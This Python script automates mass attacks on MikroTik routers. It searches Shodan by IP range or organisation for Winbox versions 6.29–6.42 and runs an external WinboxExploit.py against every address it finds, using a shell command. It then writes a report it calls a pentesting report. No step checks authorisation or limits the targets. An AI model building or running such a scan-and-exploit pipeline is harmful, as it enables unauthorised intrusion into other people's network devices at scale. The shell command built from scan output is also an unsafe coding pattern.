import os
import subprocess
from generate_report import generate_report

def scan_target(query, scan_result, output_dir):
    # Run the Shodan search command with the specified query
    result = subprocess.run(
        ['shodan', 'search', '--fields', 'ip_str,org,os,timestamp', query],
        capture_output=True,
        text=True
    )
    
    # If the command output is an error message or doesn't contain the 'os' field, don't save it
    if 'No search results found' in result.stderr:
        return False
    
    # Otherwise, append the output to the specified file
    with open(scan_result, 'a') as f:
        lines = result.stdout.split('\n')
        lines = [line for line in lines if line.strip()]  # Filter out empty lines
        f.write('\n'.join(lines))
        f.write('\n')
    
    return True

def run_exploit(output_dir, scan_result):
    # Create a filename for the exploit result
    exploit_result = os.path.join(output_dir, f"{os.path.basename(output_dir)}_execute_result.txt")
    
    # Read the scan results file and extract IP addresses
    with open(scan_result, 'r') as f:
        ip_addresses = []
        for line in f:
            if line.startswith('Detected target:') or not line.strip():
                continue
            ip_address = line.split()[0]
            ip_addresses.append(ip_address)

    # Perform exploitation for each IP address and save the results
    with open(exploit_result, 'a') as f:
        for ip_address in ip_addresses:
            cmd = f'python3 WinboxExploit.py {ip_address}'
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            f.write(f"Target: {ip_address}\n")
            f.write(result.stdout)
            f.write('\n')

    return exploit_result

def main():
    while True:
        # Display menu options
        print('Please select an option:')
        print('1. Network Range (IP range)')
        print('2. Organization Name')
        print('0. Exit')
        
        # Get user's choice
        choice = input('> ')

        if choice == '1':
            # Get IP range from the user
            keyword = input('Please enter an IP range in the format x.x.x.x/24: ')
            output_dir = keyword.replace('/', '-')
            os.makedirs(output_dir, exist_ok=True)
            scan_result = os.path.join(output_dir, f"{os.path.basename(output_dir)}_scan_result.txt")
            
            # Perform Shodan searches with different queries for the IP range
            found_results = False
            for query in [
                f'winbox 6.29 net:{keyword}',
                f'winbox 6.29.* net:{keyword}',
                f'winbox 6.3* net:{keyword}',
                f'winbox 6.40 net:{keyword}',
                f'winbox 6.40.* net:{keyword}',
                f'winbox 6.41 net:{keyword}',
                f'winbox 6.41.* net:{keyword}',
                f'winbox 6.42 net:{keyword}',
            ]:
                if scan_target(query, scan_result, output_dir):
                    found_results = True
            
            if not found_results:
                print('No search results found. Please choose another target.')
                continue
            
            print(f'Scan complete. Results saved to {scan_result}.')
            
            # Run exploitation on the scan results
            exploit_result = run_exploit(output_dir, scan_result)
            print(f'Exploit complete. Results saved to {exploit_result}.')
            
            # Generate a pentesting report
            report_path = generate_report(keyword, scan_result, exploit_result, output_dir)
            print(f'Pentesting report generated: {report_path}')
            
            break

        elif choice == '2':
            # Get organization name from the user
            keyword = input('Please enter an organization name: ')
            output_dir = keyword
            os.makedirs(output_dir, exist_ok=True)
            scan_result = os.path.join(output_dir, f"{os.path.basename(output_dir)}_scan_result.txt")
            
            # Perform Shodan searches with different queries for the organization name
            found_results = False
            for query in [
                f'winbox 6.29 net:{keyword}',
                f'winbox 6.29.* net:{keyword}',
                f'winbox 6.3* org:\"{keyword}\"',
                f'winbox 6.40 org:\"{keyword}\"',
                f'winbox 6.40.* org:\"{keyword}\"',
                f'winbox 6.41 org:\"{keyword}\"',
                f'winbox 6.41.* org:\"{keyword}\"',
                f'winbox 6.42 org:\"{keyword}\"',
            ]:
                if scan_target(query, scan_result, output_dir):
                    found_results = True
            
            if not found_results:
                print('No search results found. Please choose another target.')
                continue
            
            print(f'Scan complete. Results saved to {scan_result}.')
            
            # Run exploitation on the scan results
            exploit_result = run_exploit(output_dir, scan_result)
            print(f'Exploit complete. Results saved to {exploit_result}.')
            
            # Generate a pentesting report
            report_path = generate_report(keyword, scan_result, exploit_result, output_dir)
            print(f'Pentesting report generated: {report_path}')
            
            break

        elif choice == '0':
            # User chose to exit the program
            print('Exiting...')
            break

        else:
            # Invalid choice, prompt the user to try again
            print('Invalid choice. Please try again.')
            continue


if __name__ == "__main__":
    # Entry point of the program
    main()
